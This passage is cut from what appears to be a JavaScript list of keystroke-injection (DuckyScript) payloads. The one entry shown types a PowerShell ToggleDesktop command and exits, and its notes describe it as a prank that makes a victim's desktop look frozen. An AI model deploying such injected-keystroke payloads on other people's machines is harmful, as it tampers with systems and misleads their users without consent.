STRING $toggleDesktop = New-Object -ComObject Shell.Application; $toggleDesktop.ToggleDesktop()
ENTER
STRING exit
ENTER`,
    notes: 'Makes it look like the desktop is frozen. Icons seem unclickable because they are just an image.'
  }
]
